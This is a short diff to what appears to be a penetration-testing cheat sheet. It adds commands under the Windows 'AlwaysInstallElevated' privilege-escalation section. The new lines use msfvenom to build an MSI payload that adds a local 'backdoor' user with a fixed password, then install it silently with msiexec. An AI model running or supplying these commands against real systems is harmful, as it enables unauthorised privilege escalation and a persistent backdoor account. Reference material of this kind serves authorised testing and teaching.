@@ -211,7 +211,7 @@ aaa
 ```
 # PRIVILEGE ESCALATION WINDOWS
 ## TECHNIQUES
-##### AALWAYS ELEVATED
+##### ALWAYS ELEVATED(1)
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -219,7 +219,11 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
 Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
-
+```
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
+msiexec /quiet /qn /i C:\evil.msi
+```
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
